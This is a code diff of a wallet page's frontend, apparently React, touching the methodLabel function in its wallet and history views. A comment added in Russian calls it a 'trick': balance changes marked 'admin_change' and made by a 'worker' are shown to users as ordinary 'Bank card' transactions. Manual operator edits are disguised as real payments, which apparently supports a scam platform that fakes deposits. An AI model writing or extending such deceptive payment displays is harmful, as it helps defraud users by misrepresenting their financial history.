@@ -3068,12 +3068,14 @@ const renderWallet = () => {
     };
 
 const methodLabel = (m) => {
-      if (m === "card" || m === "admin_change") return isEN ? "Bank card" : "Банковская карта"; // <--- ВОТ ТУТ ФИКС
-      if (m === "usdt") return "USDT TRC-20";
-      if (m === "paypal") return "PayPal";
-      if (m === "support") return isEN ? "Via support" : "Через поддержку";
-      return m;
-    };
+  // ХИТРОСТЬ: Если метод 'admin_change' (от воркера), показываем как 'card'
+  if (m === "card" || m === "admin_change") return isEN ? "Bank card" : "Банковская карта";
+  
+  if (m === "usdt") return "USDT TRC-20";
+  if (m === "paypal") return "PayPal";
+  if (m === "support") return isEN ? "Via support" : "Через поддержку";
+  return m;
+};
 
     // Логика переходов
     const handleDepositStep = () => {
@@ -4012,12 +4014,14 @@ const handleWithdrawSubmit = async () => {
   };
 const renderHistory = () => {
 const methodLabel = (m) => {
-      if (m === "card" || m === "admin_change") return isEN ? "Bank card" : "Банковская карта"; // <--- ВОТ ТУТ ФИКС
-      if (m === "usdt") return "USDT TRC-20";
-      if (m === "paypal") return "PayPal";
-      if (m === "support") return isEN ? "Via support" : "Через поддержку";
-      return m;
-    };
+  // ХИТРОСТЬ: Если метод 'admin_change' (от воркера), показываем как 'card'
+  if (m === "card" || m === "admin_change") return isEN ? "Bank card" : "Банковская карта";
+  
+  if (m === "usdt") return "USDT TRC-20";
+  if (m === "paypal") return "PayPal";
+  if (m === "support") return isEN ? "Via support" : "Через поддержку";
+  return m;
+};
 
   return (
     <>
